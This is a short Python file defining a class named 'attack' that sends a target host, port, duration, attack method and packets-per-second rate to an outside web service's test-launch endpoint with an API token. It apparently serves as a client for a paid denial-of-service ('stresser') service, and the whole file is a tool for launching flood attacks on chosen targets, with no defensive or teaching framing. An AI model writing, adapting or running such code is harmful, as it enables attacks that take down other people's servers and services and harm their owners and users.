import requests
import json

class attack:
	def __init__(self, token, host, port, time, method, pps="500000"):
		self.token = token
		self.host = host
		self.port = port
		self.time = time
		self.method = method
		self.pps = pps

	def send(self):
		payload = { 'target' : self.host, 'port' : self.port, 'duration' : self.time, 'method' : self.method, 'pps' : self.pps }
		r = requests.post('https://api.sleek.to/tests/launch?token=' + str(self.token), data=payload)
		return r
